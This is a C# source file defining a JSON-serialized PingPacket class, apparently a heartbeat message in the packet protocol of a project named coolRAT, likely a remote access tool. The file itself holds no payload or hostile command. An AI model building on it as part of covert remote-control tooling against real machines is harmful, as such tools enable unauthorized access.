using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    class PingPacket : Packet
    {
        public Guid Checksum;
        [JsonConstructor]
        public PingPacket(Guid clientId, Guid checksum) : base(clientId)
        {
            Checksum = checksum;
            Type = "PingPacket";
        }
        public PingPacket(Guid clientId) : base(clientId)
        {
            Checksum = Guid.NewGuid();
            Type = "PingPacket";
        }

        public new string Serialize()
        {
            return JsonConvert.SerializeObject(this);
        }

        public new static PingPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<PingPacket>(packet_string);
        }
    }
}
